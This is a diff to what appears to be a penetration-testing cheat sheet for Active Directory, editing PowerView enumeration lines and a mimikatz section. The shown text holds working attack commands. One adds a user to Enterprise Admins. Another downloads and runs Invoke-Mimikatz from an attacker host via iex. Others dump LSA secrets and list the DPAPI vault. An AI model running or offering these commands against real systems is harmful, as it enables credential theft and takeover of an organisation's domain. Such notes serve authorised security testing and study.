@@ -44,17 +44,17 @@ Get-NetGroup $GROUP
 Get-NetComputer -Properties dnshostname,operatingsystem,operatingsystemversion -TableView
 
 # Check for logged-in users (DOES NOT WORK CURRENTLY, RUN LOCALLY)
-Get-NetSession -Computer $COMPUTER
+# Get-NetSession -Computer $COMPUTER
 
 # Find hosts on the local domain where the current user has local administrator access (DOES NOT WORK CURRENTLY, RUN LOCALLY)
-Find-LocalAdminAccess
+# Find-LocalAdminAccess
 
 # Enumerate SPNs linked to users
 Get-NetUser -SPN -Properties samaccountname,serviceprincipalname -TableView
 
 # Retrieve the ACL for the specified object (DOES NOT WORK CURRENTLY, RUN LOCALLY)
-Get-ObjectAcl -Identity $OBJECT -Select SecurityIdentifier,ActiveDirectoryRights -TableView
-Get-ObjectAcl -Identity $OBJECT -Where 'ActiveDirectoryRights eq GenericAll' -Select SecurityIdentifier,ActiveDirectoryRights -TableView
+# Get-ObjectAcl -Identity $OBJECT -Select SecurityIdentifier,ActiveDirectoryRights -TableView
+# Get-ObjectAcl -Identity $OBJECT -Where 'ActiveDirectoryRights eq GenericAll' -Select SecurityIdentifier,ActiveDirectoryRights -TableView
 
 # Enumerate domain shares (DOES NOT EXIST CURRENTLY, RUN LOCALLY)
 Find-DomainShare
@@ -136,7 +136,7 @@ net group "Enterprise Admins" mojo /add /domain
 [Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)
 
 ```bash
-# Invoke mimikatz
+# Credentialed Enumeration
 .\mimikatz.exe
 iex(new-object net.webclient).downloadstring("http://$OUR_IP/Invoke-Mimikatz.ps1")
 
@@ -149,6 +149,9 @@ lsadump::lsa /patch
 lsadump::secrets
 token::revert
 exit
+
+# DPAPI
+vault::list
 ```
 
 **[gpp-decrypt](0%20Tools/gpp-decrypt.md)**
